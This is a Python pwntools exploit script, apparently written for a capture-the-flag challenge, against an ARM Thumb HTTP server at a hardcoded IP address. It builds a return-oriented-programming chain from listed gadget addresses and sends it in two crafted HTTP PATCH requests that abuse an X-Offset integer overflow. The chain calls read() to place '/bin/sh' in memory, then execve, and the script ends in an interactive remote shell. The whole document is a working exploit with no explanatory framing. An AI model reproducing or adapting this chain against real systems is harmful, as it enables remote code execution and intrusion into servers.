from pwn import *
context.arch = 'thumb'

s = remote('104.236.216.181', 1703)

#    d95e:   4628        mov r0, r5
#    d960:   4631        mov r1, r6
#    d962:   463a        mov r2, r7
#    d964:   4798        blx r3
SET_ARGUMENTS = 0xd95e+1

#    d9b4:   df00        svc 0
#    d9b6:   bd80        pop {r7, pc}
SVC_POP_R7_PC = 0xd9b4+1

#    1b476: bd08        pop {r3, pc}
POP_R3_PC = 0x1b476+1

#     8a50: bd80        pop {r7, pc}
POP_R7_PC = 0x8a50+1

# These BSS addresses are where we will store
# our execve buffers.
BINSH   = 0x78ac0         # &"/bin/sh"
P_BINSH = 0x78ad0        # argv

#    997c:   e8bd 83f0   ldmia.w sp!, {r4, r5, r6, r7, r8, r9, pc}
POP_R4_THRU_R9_PC = 0x997c+1

#
# These registers are loaded when exiting from
# the function whose frame we have overwritten
#
rop  = pack(0xdeadbeef)  # R4, trash
rop += pack( 0)          # R5, read() file descriptor
rop += pack(BINSH)       # R6, read() buffer
rop += pack(128)         # R7, read() size
rop += pack(POP_R3_PC)   # PC

#
# Now we load up R3 with the address of "pop {r7,pc}",
# which will be used at the end of SET_ARGUMENTS
#
rop += pack(POP_R7_PC)            # r3
rop += pack(SET_ARGUMENTS)        # pc

#
# We are now at POP_R7_PC.
# Here we are loading R7, which holds the syscall number.
#
rop += pack(constants.SYS_read)   # r7
rop += pack(SVC_POP_R7_PC)        # pc

# We are now at SVC_POP_R7_PC, which invokes read()
# to read "/bin/sh" into the BSS.
rop += pack(0)                    # r7 = envp
rop += pack(POP_R4_THRU_R9_PC)    # pc

# Now we load up a bunch of registers before
# Execve
rop += pack(0)                    # r4
rop += pack(BINSH)                # r5
rop += pack(P_BINSH)              # r6
rop += pack(0)                    # r7
rop += pack(0)                    # r8
rop += pack(0)                    # r9
rop += pack(POP_R3_PC)            # pc

# Here we load up R7 with SYS_execve, and
# then shuffle around all of the registers for
# the syscall
rop += pack(POP_R7_PC)            # R3
rop += pack(SET_ARGUMENTS)
rop += pack(constants.SYS_execve)    # R7

# Now we invoke execve()
rop += pack(SVC_POP_R7_PC)


# First stage, which sets up our ROP stack
first = 'PATCH /index.html HTTP/1.1\r\nContent-Length: 132\r\n\r\n '
first += '\x00'*43
first += rop

# Second stage, which invokes the ROP stack
second = 'PATCH /index.html HTTP/1.1\r\nContent-Length: 1\r\nX-Offset: 4294967280\r\nUser-Agent: aaaaaaaaaaaaaaa'
second += '\x00'*80
second += '\r\n\r\n\x00'

# Send the first stage
s.send(first)

# Receive all of the data that gets pumped out
s.recvuntil('HTTP/1.1 200 OK')
s.recvuntil('\r\n')
s.recvuntil('\r\n')
s.recvuntil('\r\n')
s.recvuntil('\r\n')
s.recvuntil('\r\n')

# Send the second stage
s.send(second)

# Our ROP stack is now invoking the syscall read(),
# so that we can have "/bin/sh" at a known location
# in the BSS.
s.send('/bin/sh\x00' + 'A'*8 + pack(P_BINSH) + '\x00\x00\x00\x00\n')

# Should hit execve and win.
s.clean()
s.interactive()
